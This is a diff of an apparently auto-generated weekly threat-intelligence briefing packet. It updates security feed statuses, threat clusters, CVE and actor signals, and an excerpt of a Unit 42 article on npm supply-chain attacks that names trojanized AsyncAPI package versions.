@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-15T22:07:55.371909+00:00
+- Generated: 2026-07-16T00:04:31.314191+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 77
-- Total items in window: 334
-- Total clusters raw: 172
-- Total clusters in packet: 79
-- Dropped low score: 93
+- Total items in window: 332
+- Total clusters raw: 170
+- Total clusters in packet: 78
+- Dropped low score: 92
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -74,12 +74,22 @@
   - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
   - Item count: 15
-  - In window count: 2
+  - In window count: 3
 - **CrowdStrike** (threat_research_primary)
   - URL: https://www.crowdstrike.com/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **Microsoft Security Blog** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 5
 - **Google Threat Analysis Group** (threat_research_primary)
   - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
@@ -90,13 +100,8 @@
   - Status: ok
   - Item count: 25
   - In window count: 0
-- **Microsoft Security Blog** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 5
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
@@ -110,21 +115,6 @@
   - Status: ok
   - Item count: 15
   - In window count: 5
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 3
-- **Citizen Lab** (threat_research_primary)
-  - URL: https://citizenlab.ca/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Check Point Research** (threat_research_primary)
   - URL: https://research.checkpoint.com/feed/
   - Status: ok
@@ -135,30 +125,40 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **SANS Internet Storm Center** (government_authoritative)
-  - URL: https://isc.sans.edu/rssfeed_full.xml
+- **Citizen Lab** (threat_research_primary)
+  - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 10
+  - In window count: 1
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
+  - Status: ok
+  - Item count: 20
+  - In window count: 3
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
   - Item count: 100
   - In window count: 1
+- **SANS Internet Storm Center** (government_authoritative)
+  - URL: https://isc.sans.edu/rssfeed_full.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
   - In window count: 6
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
+- **PortSwigger Research** (offensive_vulnerability_research)
+  - URL: https://portswigger.net/research/rss
   - Status: ok
-  - Item count: 50
-  - In window count: 4
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
-  - Status: ok
-  - Item count: 10
+  - Item count: 40
   - In window count: 0
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
@@ -170,55 +170,55 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **PortSwigger Research** (offensive_vulnerability_research)
-  - URL: https://portswigger.net/research/rss
-  - Status: ok
-  - Item count: 40
-  - In window count: 0
-- **Exploit-DB** (offensive_vulnerability_research)
-  - URL: https://www.exploit-db.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 0
 - **Assetnote** (offensive_vulnerability_research)
   - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
   - Item count: 78
   - In window count: 0
-- **watchTowr Labs** (offensive_vulnerability_research)
-  - URL: https://labs.watchtowr.com/rss/
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
   - Status: ok
-  - Item count: 15
+  - Item count: 50
+  - In window count: 3
+- **Exploit-DB** (offensive_vulnerability_research)
+  - URL: https://www.exploit-db.com/rss.xml
+  - Status: ok
+  - Item count: 50
   - In window count: 0
 - **The DFIR Report** (detection_response_operations)
   - URL: https://thedfirreport.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **watchTowr Labs** (offensive_vulnerability_research)
+  - URL: https://labs.watchtowr.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 0
 - **TrustedSec** (detection_response_operations)
   - URL: https://www.trustedsec.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **Proofpoint Threat Insight** (detection_response_operations)
-  - URL: https://www.proofpoint.com/us/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Sophos X-Ops** (detection_response_operations)
-  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
+- **Proofpoint Threat Insight** (detection_response_operations)
+  - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
-  - Item count: 15
-  - In window count: 1
+  - Item count: 10
+  - In window count: 0
 - **Elastic Security Labs** (detection_response_operations)
   - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
   - Item count: 20
+  - In window count: 1
+- **Sophos X-Ops** (detection_response_operations)
+  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
+  - Status: ok
+  - Item count: 15
   - In window count: 1
 - **SpecterOps** (detection_response_operations)
   - URL: https://medium.com/feed/specter-ops-posts
@@ -229,32 +229,37 @@
   - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
   - Item count: 30
-  - In window count: 2
+  - In window count: 1
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 9
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 6
+  - In window count: 10
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **Huntress** (detection_response_operations)
   - URL: https://www.huntress.com/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 6
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 6
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
@@ -265,16 +270,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
-- **Sysdig** (detection_response_operations)
-  - URL: https://sysdig.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Cloudflare Security** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/security/rss/
   - Status: ok
@@ -285,6 +280,11 @@
   - Status: ok
   - Item count: 100
   - In window count: 5
+- **Sysdig** (detection_response_operations)
+  - URL: https://sysdig.com/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
@@ -295,30 +295,30 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 3
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
   - In window count: 15
-- **Google DeepMind Blog** (ai_security_agentic_risk)
-  - URL: https://deepmind.google/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
+  - In window count: 1
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 4
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **Google DeepMind Blog** (ai_security_agentic_risk)
+  - URL: https://deepmind.google/blog/rss.xml
+  - Status: ok
+  - Item count: 100
   - In window count: 1
 - **The Record** (cyber_news_breach_reporting)
   - URL: https://therecord.media/feed
@@ -335,26 +335,26 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 22
-- **AI Snake Oil** (ai_security_agentic_risk)
-  - URL: https://www.aisnakeoil.com/feed
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
 - **GreyNoise** (cloud_identity_infrastructure)
   - URL: https://www.greynoise.io/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 1
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **AI Snake Oil** (ai_security_agentic_risk)
+  - URL: https://www.aisnakeoil.com/feed
+  - Status: ok
+  - Item count: 20
+  - In window count: 2
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 20
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
@@ -365,6 +365,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Schneier on Security** (practitioner_analysis)
   - URL: https://www.schneier.com/feed/atom/
   - Status: ok
@@ -375,36 +380,21 @@
   - Status: ok
   - Item count: 15
   - In window count: 1
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Reddit r/cybersecurity** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/cybersecurity/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 3
 - **Krebs on Security** (practitioner_analysis)
   - URL: https://krebsonsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
+- **Reddit r/cybersecurity** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/cybersecurity/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **Reddit r/blueteamsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/blueteamsec/.rss
   - Status: ok
@@ -420,26 +410,36 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
 - **Reddit r/netsecstudents** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - URL: https://www.infosecurity-magazine.com/rss/news/
-  - Status: ok
-  - Item count: 100
-  - In window count: 29
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
   - Item count: 100
   - In window count: 3
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 2
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - URL: https://www.infosecurity-magazine.com/rss/news/
+  - Status: ok
+  - Item count: 100
+  - In window count: 29
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
@@ -488,7 +488,7 @@
   - affected_products: Microsoft SharePoint
   - cve_ids: CVE-2026-56164
   - urgency_signals: zero_day, no_patch_yet, actively_exploited
-- Cluster IDs: b1e7573c37, 70d5ef962f, 20fe5862d8, 8f654ac030, 3ab4666a65, 83ac9f2074
+- Cluster IDs: b1e7573c37, 70d5ef962f, 20fe5862d8, 8f654ac030, 83ac9f2074, 3ab4666a65
 - Links:
   - https://www.rapid7.com/blog/post/ve-cve-2026-55040-microsoft-sharepoint-jwt-token-authentication-bypass-fixed
   - https://orca.security/resources/blog/microsoft-july-2026-patch-tuesday-sharepoint-zero-day/
@@ -497,8 +497,8 @@
   - https://www.securityweek.com/unpatched-cursor-vulnerability-exposes-users-to-code-execution/
   - https://www.securityweek.com/progress-confirms-zero-day-vulnerability-behind-sharefile-disruption/
   - https://blog.talosintelligence.com/microsoft-patch-tuesday-july-2026/
-  - https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
   - https://www.securityweek.com/critical-vulnerabilities-patched-with-fresh-chrome-150-firefox-152-updates/
+  - https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
 
 ### Microsoft Defender vulnerability activity
 - Anchor signal: Microsoft Defender
@@ -541,41 +541,21 @@
   - https://cyberscoop.com/sonicwall-zero-day-vulnerabilities-exploited/
   - https://www.bleepingcomputer.com/news/security/zoom-warns-of-critical-account-takeover-vulnerability/
 
-### Ivanti active exploitation
-- Anchor signal: Ivanti
-- Theme key: ivanti
-- Cluster count: 4
-- Article count: 4
-- Cohesion: 0.227
-- Shared strong signals: Ivanti
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: zero_day, supply_chain, active_exploitation
-  - affected_industries: critical_infrastructure
-  - affected_products: Ivanti, Fortinet, Microsoft SharePoint
-  - urgency_signals: zero_day, no_patch_yet, actively_exploited
-- Cluster IDs: 70d5ef962f, 8d0224c08d, 9097ac0c9e, 83ac9f2074
-- Links:
-  - https://www.securityweek.com/unpatched-cursor-vulnerability-exposes-users-to-code-execution/
-  - https://www.recordedfuture.com/blog/june-2026-cve-landscape
-  - https://www.infosecurity-magazine.com/news/progress-restores-sharefile/
-  - https://www.securityweek.com/critical-vulnerabilities-patched-with-fresh-chrome-150-firefox-152-updates/
-
 ### supply chain targeting npm
 - Anchor signal: npm
 - Theme key: npm
 - Cluster count: 3
-- Article count: 9
-- Cohesion: 0.304
+- Article count: 10
+- Cohesion: 0.23
 - Shared strong signals: npm
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
   - threat_categories: supply_chain
   - affected_products: npm
-- Cluster IDs: 46a2a9ea7e, c8e0a6559d, 54a0f013e2
+- Cluster IDs: e3bb17ebc2, c8e0a6559d, 54a0f013e2
 - Links:
+  - https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
   - https://securitylabs.datadoghq.com/articles/compromised-asyncapi-npm-packages/
   - https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions
   - https://www.bleepingcomputer.com/news/security/-asyncapi-npm-packages-infected-with-credential-stealing-malware/
@@ -583,41 +563,67 @@
   - https://research.checkpoint.com/2026/13th-july-threat-intelligence-report/
   - https://orca.security/resources/blog/beyond-cves-detect-malicious-packages/
 
-### Google Cloud vulnerability activity
-- Anchor signal: Google Cloud
-- Theme key: google-cloud
-- Cluster count: 3
-- Article count: 6
-- Cohesion: 0.253
-- Shared strong signals: Google Cloud
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - affected_products: Google Cloud
-- Cluster IDs: 5a4c062977, e54abb8741, 9097ac0c9e
-- Links:
-  - https://cloud.google.com/blog/products/identity-security/introducing-k8s-aibom-on-gke-for-automated-ai-bills-of-materials/
-  - https://cloud.google.com/blog/products/data-analytics/analyze-and-govern-gemini-enterprise-at-scale-with-bigquery/
-  - https://www.bleepingcomputer.com/news/security/google-gemini-cli-abused-as-a-hacking-agent-malware-botnet-operator/
-  - https://www.infosecurity-magazine.com/news/progress-restores-sharefile/
-
-### Apple iOS/macOS vulnerability activity
-- Anchor signal: Apple iOS/macOS
-- Theme key: apple-ios-macos
+### TeamPCP: supply chain
+- Anchor signal: TeamPCP
+- Theme key: teampcp
 - Cluster count: 2
-- Article count: 4
-- Cohesion: 0.2
-- Shared strong signals: Apple iOS/macOS
+- Article count: 9
+- Cohesion: 0.765
+- Shared strong signals: TeamPCP
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - affected_products: Apple iOS/macOS
-- Cluster IDs: 598aa947b4, 9097ac0c9e
+  - threat_categories: supply_chain
+  - actor_attribution: TeamPCP
+  - affected_products: GitHub
+- Cluster IDs: e3bb17ebc2, 86ef70edb1
 - Links:
-  - https://www.rapid7.com/blog/post/pt-weekly-metasploit-update-exploits-for-flowiseai-csv-agent-and-macos-package-kit
-  - https://www.helpnetsecurity.com/2026/07/15/impersonated-brands-github-infostealer-download/
-  - https://thehackernews.com/2026/07/crashstealer-macos-malware-uses.html
-  - https://www.infosecurity-magazine.com/news/progress-restores-sharefile/
+  - https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
+  - https://securitylabs.datadoghq.com/articles/compromised-asyncapi-npm-packages/
+  - https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions
+  - https://www.bleepingcomputer.com/news/security/-asyncapi-npm-packages-infected-with-credential-stealing-malware/
+  - https://thehackernews.com/2026/07/compromised-asyncapi-npm-packages.html
+  - https://blog.talosintelligence.com/the-serpents-tongue-luring-the-python-out-of-its-den/
+
+### Ivanti active exploitation
+- Anchor signal: Ivanti
+- Theme key: ivanti
+- Cluster count: 3
+- Article count: 3
+- Cohesion: 0.242
+- Shared strong signals: Ivanti
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: supply_chain, zero_day, active_exploitation
+  - affected_industries: critical_infrastructure
+  - affected_products: Fortinet, Ivanti, Microsoft SharePoint
+  - urgency_signals: zero_day, no_patch_yet, actively_exploited
+- Cluster IDs: 70d5ef962f, 8d0224c08d, 83ac9f2074
+- Links:
+  - https://www.securityweek.com/unpatched-cursor-vulnerability-exposes-users-to-code-execution/
+  - https://www.recordedfuture.com/blog/june-2026-cve-landscape
+  - https://www.securityweek.com/critical-vulnerabilities-patched-with-fresh-chrome-150-firefox-152-updates/
+
+### Fortinet active exploitation
+- Anchor signal: Fortinet
+- Theme key: fortinet
+- Cluster count: 3
+- Article count: 3
+- Cohesion: 0.242
+- Shared strong signals: Fortinet
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: supply_chain, zero_day, active_exploitation
+  - affected_industries: critical_infrastructure
+  - affected_products: Fortinet, Ivanti, Microsoft SharePoint
+  - urgency_signals: zero_day, no_patch_yet, actively_exploited
+- Cluster IDs: 70d5ef962f, 8d0224c08d, 83ac9f2074
+- Links:
+  - https://www.securityweek.com/unpatched-cursor-vulnerability-exposes-users-to-code-execution/
+  - https://www.recordedfuture.com/blog/june-2026-cve-landscape
+  - https://www.securityweek.com/critical-vulnerabilities-patched-with-fresh-chrome-150-firefox-152-updates/
 
 ### Cisco vulnerability activity
 - Anchor signal: Cisco
@@ -673,50 +679,48 @@
   - https://thehackernews.com/2026/07/microsoft-maps-year-long-shinyhunters.html
   - https://research.checkpoint.com/2026/13th-july-threat-intelligence-report/
 
-### supply chain targeting PyPI
-- Anchor signal: PyPI
-- Theme key: pypi
+### phishing social eng targeting Salesforce
+- Anchor signal: Salesforce
+- Theme key: salesforce
 - Cluster count: 2
-- Article count: 2
-- Cohesion: 0.294
-- Shared strong signals: PyPI
+- Article count: 3
+- Cohesion: 0.2
+- Shared strong signals: Salesforce
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: supply_chain
-  - affected_products: PyPI
-- Cluster IDs: 86ef70edb1, 54a0f013e2
+  - threat_categories: phishing_social_eng
+  - affected_products: Salesforce
+- Cluster IDs: 7df2f246d4, b7474f0127
 - Links:
-  - https://blog.talosintelligence.com/the-serpents-tongue-luring-the-python-out-of-its-den/
-  - https://orca.security/resources/blog/beyond-cves-detect-malicious-packages/
+  - https://www.microsoft.com/en-us/security/blog/2026/07/13/defending-saas-based-applications-against-shinyhunters-oauth-abuse/
+  - https://thehackernews.com/2026/07/microsoft-maps-year-long-shinyhunters.html
+  - https://www.intel471.com/blog/operation-fake-kickoff-attackers-abuse-recruiters-and-saas-to-harvest-work-credentials
 
-### Scattered Spider campaign activity
-- Anchor signal: Scattered Spider
-- Theme key: scattered-spider
+### Google Cloud vulnerability activity
+- Anchor signal: Google Cloud
+- Theme key: google-cloud
 - Cluster count: 2
-- Article count: 2
-- Cohesion: 0.25
-- Shared strong signals: Scattered Spider
+- Article count: 5
+- Cohesion: 0.333
+- Shared strong signals: Google Cloud
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - actor_attribution: Scattered Spider
-  - affected_industries: financial_services
-- Cluster IDs: f8c7235a08, ae25d6203b
+  - affected_products: Google Cloud
+- Cluster IDs: 5a4c062977, e54abb8741
 - Links:
-  - https://www.intel471.com/blog/threat-hunting-case-study-scattered-spider
-  - https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html
+  - https://cloud.google.com/blog/products/identity-security/introducing-k8s-aibom-on-gke-for-automated-ai-bills-of-materials/
+  - https://cloud.google.com/blog/products/data-analytics/analyze-and-govern-gemini-enterprise-at-scale-with-bigquery/
+  - https://www.bleepingcomputer.com/news/security/google-gemini-cli-abused-as-a-hacking-agent-malware-botnet-operator/
 
 ## Forward signals
 
 ### Novelty
-- Novel cves: 4
-  - CVE-2026-53409 (first seen via BleepingComputer at 2026-07-15T20:16:02+00:00, cluster 267e16d267)
-  - CVE-2026-53410 (first seen via BleepingComputer at 2026-07-15T20:16:02+00:00, cluster 267e16d267)
-  - CVE-2026-53411 (first seen via BleepingComputer at 2026-07-15T20:16:02+00:00, cluster 267e16d267)
-  - CVE-2026-53412 (first seen via BleepingComputer at 2026-07-15T20:16:02+00:00, cluster 267e16d267)
+- Novel cves: 0
 - Novel actors: 0
-- Novel products: 0
+- Novel products: 1
+  - Google Workspace (first seen via Intel 471 at 2026-07-15T18:00:00+00:00, cluster b7474f0127)
 
 ### Velocity bursts (1)
 - **How I tricked Claude into leaking your deepest, darkest secrets**
@@ -744,17 +748,12 @@
 - Pair: CVE-2026-48939 + WordPress (cluster 08882287bf, first observation: True)
 - Pair: CVE-2026-56291 + WordPress (cluster 08882287bf, first observation: True)
 
-### Drift (3)
+### Drift (2)
 - **ShinyHunters** (cluster 7df2f246d4)
   - New industries: manufacturing_industrial, retail_ecommerce
   - New products: Microsoft Defender
   - Prior top industries: education, financial_services, government
   - Prior top products: Anthropic/Claude, Salesforce, npm
-- **TeamPCP** (cluster 86ef70edb1)
-  - New industries: (none)
-  - New products: PyPI
-  - Prior top industries: financial_services, government, healthcare
-  - Prior top products: GitHub, Kubernetes, npm
 - **Scattered Spider** (cluster f8c7235a08)
   - New industries: critical_infrastructure, manufacturing_industrial, telecommunications
   - New products: ScreenConnect
@@ -763,7 +762,7 @@
 
 ### Persistence (6)
 - actor_attribution: ShinyHunters (weeks observed: 7, cluster 7df2f246d4)
-- actor_attribution: TeamPCP (weeks observed: 6, cluster 86ef70edb1)
+- actor_attribution: TeamPCP (weeks observed: 6, cluster e3bb17ebc2)
 - actor_attribution: Scattered Spider (weeks observed: 5, cluster f8c7235a08)
 - cve_ids: CVE-2026-45659 (weeks observed: 4, cluster 3ab4666a65)
 - cve_ids: CVE-2025-5777 (weeks observed: 3, cluster aaaf47b0ea)
@@ -1012,6 +1011,72 @@ Share Link copied to clipboard! Tags Social engineering Supply chain attack Vish
   - Link: https://thehackernews.com/2026/07/microsoft-maps-year-long-shinyhunters.html
   - Summary: Attackers whose methods line up with the data-extortion group ShinyHunters have spent the past year walking into corporate Salesforce environments without exploiting a single flaw in the platform. The way in has been the trust the organization had already extended, usually through the OAuth connections that tie Salesforce to the apps and third-party vendors around it. In
 
+### Cluster e3bb17ebc2 — score 26
+
+- Title: The npm Threat Landscape: Attack Surface and Mitigations (Updated July 15)
+- Source: Unit 42 (threat_research_primary)
+- Published: 2026-07-15T23:00:33+00:00
+- Link: https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
+- Fetch status: ok
+- Member count: 8
+- Corroborating source count: 5
+- Strong signals: npm
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, ddos, supply_chain
+- actor_attribution: TeamPCP
+- affected_industries: financial_services
+- affected_products: GitHub, npm
+- content_type: incident_report, intel_roundup, news_report
+- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: supply_chain
+- actor_attribution: TeamPCP
+- affected_products: npm, GitHub
+- content_type: intel_roundup
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Unit 42 analyzes npm supply chain evolution post-Shai Hulud. Discover wormable malware, CI/CD persistence, multi-stage attacks and more. The post The npm Threat Landscape: Attack Surface and Mitigations (Updated July 15) appeared first on Unit 42 .
+```
+
+#### Full body
+
+```
+Threat Research Center High Profile Threats Malware Malware The npm Threat Landscape: Attack Surface and Mitigations (Updated July 15) 27 min read Related Products Advanced DNS Security Advanced URL Filtering Cloud-Delivered Security Services Cortex Cortex Cloud Unit 42 Incident Response By: Unit 42 Published: July 15, 2026 Categories: High Profile Threats Malware Tags: Credential Harvesting GitHub Npm packages Obfuscation Payload Supply chain Worm propagation Share Executive Summary The security of the npm ecosystem reached a critical inflection point in September 2025. The Shai-Hulud worm, a self-replicating malware that automated the compromise and redistribution of malicious packages, marked the end of the “nuisance” era of npm attacks and the beginning of a high-consequence threat landscape. Since that watershed moment, Unit 42 has tracked an aggressive acceleration in the frequency and technical depth of supply chain compromises. Attacks have evolved from a series of isolated typosquatting incidents into systematic campaigns by various threat actors to weaponize the trust that powers modern software development. April 2026 Campaigns We have seen two campaigns in April: the first started April 22, 2026 and included the string Shai-Hulud: The Third Coming . The second started April 29, 2026 and is known as Mini Shai-Hulud . May 2026 Campaigns In May 2026, the Mini Shai-Hulud campaign continued with two new waves attributed to TeamPCP. These campaigns introduced two unique elements. One campaign used a credential-free initial access technique. The other campaign generated the highest single-hour package count of any Shai-Hulud worm to date. Copycat activity has made future attribution to TeamPCP more difficult. June 2026 Campaign A new supply chain attack on June 1, 2026 compromised at least 32 packages published under the @redhat-cloud-services npm namespace. The attacker bypassed code review entirely, pushing a payload named Miasma. July 2026 Campaign Attackers compromised the release pipelines of four core AsyncAPI GitHub repositories on July 14, 2026. In a campaign calling itself miasma-train-p1 , they published five trojanized packages to npm: @asyncapi/generator@3.3.1 @asyncapi/specs@6.11.2 @asyncapi/specs@6.11.2-alpha.1 @asyncapi/generator-helpers@1.1.1 @asyncapi/generator-components@0.7.1 The payload appears to be a descendant of the Miasma remote access Trojan (RAT). The New Baseline for npm Threats The Shai-Hulud incident proved that the npm registry could be used as a force multiplier for malware 